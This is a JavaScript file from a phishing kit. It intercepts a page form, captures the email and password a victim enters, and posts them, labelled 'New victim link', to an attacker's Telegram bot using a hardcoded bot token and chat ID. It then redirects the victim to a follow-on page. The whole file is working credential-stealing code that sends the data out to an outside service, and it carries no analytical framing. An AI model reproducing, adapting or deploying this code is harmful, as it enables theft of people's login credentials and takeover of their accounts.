document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("allForm");
    if (!form) return;

    const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
    const ADMIN_ID = "6976365864";

    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get("id") || ADMIN_ID;
    const pageName = document.title || "Unknown Page";

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const email = form.message_title?.value || "N/A";
        const password = form.description?.value || "N/A";

        const message = `
📩 New victim link (${pageName}):

📧 email: ${email}
🔑 password: ${password}
🆔 Telegram ID: ${userId}
🌐 URL: ${window.location.href}
🕒 Time: ${new Date().toLocaleString()}
        `;

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: userId,
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(res => {
            if (res.ok) {
                window.location.href = `gma.html?id=${userId}`;
            } else {
                alert("Failed please try again.");
            }
        })
        .catch(err => {
            console.error("Telegram API error:", err);
            alert("Network error.");
        });
    });
});